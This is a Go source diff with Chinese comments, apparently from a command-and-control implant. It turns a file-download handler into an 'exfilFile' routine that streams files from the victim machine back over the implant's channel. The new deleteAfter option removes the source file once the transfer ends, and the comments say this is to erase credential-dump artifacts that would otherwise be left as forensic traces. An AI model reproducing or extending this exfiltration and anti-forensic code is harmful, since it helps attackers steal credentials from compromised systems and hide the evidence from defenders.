@@ -146,58 +146,66 @@ func Upload(filePath string, fileContent []byte, isStart bool) (int, error) {
 // 首包 replyType 22：fileLen(8) | requestId(4) | path
 // 分块 replyType 26：requestId(4) | chunk
 func CmdDownload(cmdBuf []byte) ([]byte, error) {
-	filePath := cmdBuf
-	strFilePath := string(filePath)
-	strFilePath = strings.ReplaceAll(strFilePath, "\\", "/")
-	go func() {
-		fileInfo, err := os.Stat(strFilePath)
-		if err != nil {
-			communication.ErrorProcess(err)
-			return
-		}
-		fileLen := fileInfo.Size()
-
-		// K1: 移除错误的本地"断点续传"——两次 Stat 统计的都是同一个源文件，
-		// resumeOffset 恒等于 fileLen → Seek(EOF) 后首轮 Read 返回 0，下载永远 0 字节。
-		// 客户端无对端进度信息，协议按服务端需求从头发送。
-		resumeOffset := int64(0)
-
-		// 生成本次下载的 requestId
-		reqBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(reqBytes, uint32(time.Now().UnixNano()))
-
-		fileLenBytes := make([]byte, 8)
-		binary.BigEndian.PutUint64(fileLenBytes, uint64(fileLen))
-		result := utils.BytesCombine(fileLenBytes, reqBytes, filePath)
-		communication.DataProcess(22, result)
-
-		fileHandle, err := os.Open(strFilePath)
-		if err != nil {
-			communication.ErrorProcess(err)
-			return
-		}
-		defer fileHandle.Close()
-		if resumeOffset > 0 {
-			fileHandle.Seek(resumeOffset, io.SeekStart)
-		}
-		var fileContent []byte
-		fileBuf := make([]byte, 2000000)
-		for {
-			n, err := fileHandle.Read(fileBuf)
-			if err != nil && err != io.EOF {
-				break
-			}
-			if n == 0 {
-				break
-			}
-			fileContent = fileBuf[:n]
-			result = utils.BytesCombine(reqBytes, fileContent)
-			communication.DataProcess(DOWNLOAD, result)
-		}
-		communication.DataProcess(0, []byte("[+] "+strFilePath+" download success"))
-	}()
-
+	strFilePath := strings.ReplaceAll(string(cmdBuf), "\\", "/")
+	go exfilFile(strFilePath, false)
 	return []byte("[+] Downloading " + strFilePath), nil
+}
+
+// exfilFile 把本地文件经下载通道回传（type22 头 + type26 分块）。
+// deleteAfter=true 时在回传结束后（无论成败）删除源文件 —— 凭据转储这类制品
+// 留在目标磁盘上是最典型的取证痕迹，且体积可观。
+// 从 CmdDownload 抽出：凭据获取复用同一条回传通道，不另起一套协议。
+func exfilFile(strFilePath string, deleteAfter bool) {
+	if deleteAfter {
+		defer func() {
+			if err := os.Remove(strFilePath); err == nil {
+				debuglog.Printf("🧹 [CRED] 已删除本地制品: %s\n", strFilePath)
+			}
+		}()
+	}
+	fileInfo, err := os.Stat(strFilePath)
+	if err != nil {
+		communication.ErrorProcess(err)
+		return
+	}
+	fileLen := fileInfo.Size()
+
+	// K1: 客户端无对端进度信息，协议按服务端需求从头发送
+	resumeOffset := int64(0)
+
+	// 生成本次下载的 requestId
+	reqBytes := make([]byte, 4)
+	binary.BigEndian.PutUint32(reqBytes, uint32(time.Now().UnixNano()))
+
+	fileLenBytes := make([]byte, 8)
+	binary.BigEndian.PutUint64(fileLenBytes, uint64(fileLen))
+	result := utils.BytesCombine(fileLenBytes, reqBytes, []byte(strFilePath))
+	communication.DataProcess(22, result)
+
+	fileHandle, err := os.Open(strFilePath)
+	if err != nil {
+		communication.ErrorProcess(err)
+		return
+	}
+	defer fileHandle.Close()
+	if resumeOffset > 0 {
+		fileHandle.Seek(resumeOffset, io.SeekStart)
+	}
+	var fileContent []byte
+	fileBuf := make([]byte, 2000000)
+	for {
+		n, err := fileHandle.Read(fileBuf)
+		if err != nil && err != io.EOF {
+			break
+		}
+		if n == 0 {
+			break
+		}
+		fileContent = fileBuf[:n]
+		result = utils.BytesCombine(reqBytes, fileContent)
+		communication.DataProcess(DOWNLOAD, result)
+	}
+	communication.DataProcess(0, []byte("[+] "+strFilePath+" download success"))
 }
 
 // pendingRequest(4) || dirPathLen(4) || dirPath(dirPathLen)
